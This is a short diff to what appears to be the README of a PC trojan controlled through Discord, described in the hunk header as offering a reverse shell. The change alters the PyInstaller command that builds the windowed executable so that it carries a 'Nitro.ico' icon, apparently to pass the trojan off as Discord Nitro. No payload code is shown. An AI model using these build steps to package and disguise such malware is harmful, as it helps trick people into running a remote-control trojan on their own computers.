@@ -51,7 +51,7 @@ A trojan for pc that can be controlled via discord, Reverse shell (powershell, c
 
 > ### generate exe :
 > ```yaml
-> pyinstaller --noconfirm --onefile --icon "" --windowed "main.py"
+> pyinstaller --noconfirm --onefile --icon "icons\Nitro.ico" --windowed "main.py"
 > ```
 
 > ### remove the trojan:
